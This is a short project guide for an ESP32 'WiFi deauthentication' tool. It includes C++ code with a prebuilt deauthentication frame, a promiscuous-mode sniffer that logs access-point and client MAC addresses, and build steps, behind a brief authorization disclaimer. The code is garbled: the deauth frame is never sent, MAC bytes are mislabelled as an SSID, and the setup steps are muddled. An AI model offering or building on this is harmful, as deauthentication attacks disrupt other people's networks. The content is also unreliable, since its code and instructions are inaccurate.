## PlatformIO ESP32 WiFi Deauthentication Project

### Project Setup

#### Prerequisites
- PlatformIO installed
- VSCode (recommended)
- ESP32 development board

### Source Code

#### `main.cpp`

```cpp
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

uint8_t deauthPacket[26] = {
    0xC0, 0x00,
    0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x88, 0xC9, 0xB3, 0x09, 0x5B, 0xD0, // Target SSID in hex
    0x88, 0xC9, 0xB3, 0x09, 0x5B, 0xD0, // Repeating SSID in hex
    0x00, 0x00,
    0x01, 0x00
};

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t* type) {
    wifi_promiscuous_pkt_t* packet = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* frame = packet->payload;
    uint8_t* destMac = frame + 4;     // Destination MAC
    uint8_t* srcMac = frame + 10;     // Source MAC
    uint8_t* bssid = frame + 16;      // BSSID (for beacon/data frames)
    
    Serial.print("AP (BSSID): ");
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", bssid[i]);
        if (i < 5) Serial.print(":");
    }
    
    Serial.print(" | Client (MAC): ");
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", srcMac[i]);
        if (i < 5) Serial.print(":");
    }
    Serial.println();
}

void setup() {
    Serial.begin(115200);
    WiFi.mode(WIFI_STA);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(snifferCallback);
    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE); // Adjust channel as needed
    esp_wifi_set_promiscuous(true);
}

void loop() {
    delay(100);
}
```

### Project Workflow

#### Getting Target SSID
1. Put WiFi adapter in monitor mode
2. Capture the target SSID in hex format
3. Replace the hex values in `deauthPacket` array

#### Compilation Commands

1. Compile the project:
   ```bash
   pio run
   ```

2. Upload and monitor:
   ```bash
   pio run --target upload && pio device monitor
   ```

#### Troubleshooting

- If you encounter header errors, reinitialize the project:
  ```bash
  pio run init --ide vscode
  ```

### Important Notes
- Ensure `upload_port` is correctly configured in `platformio.ini`
- Verify channel settings match your target network
- **Disclaimer**: Use only for educational purposes with proper authorization

### Recommendations
- Double-check MAC addresses
- Verify WiFi adapter compatibility
- Understand local regulations regarding WiFi monitoring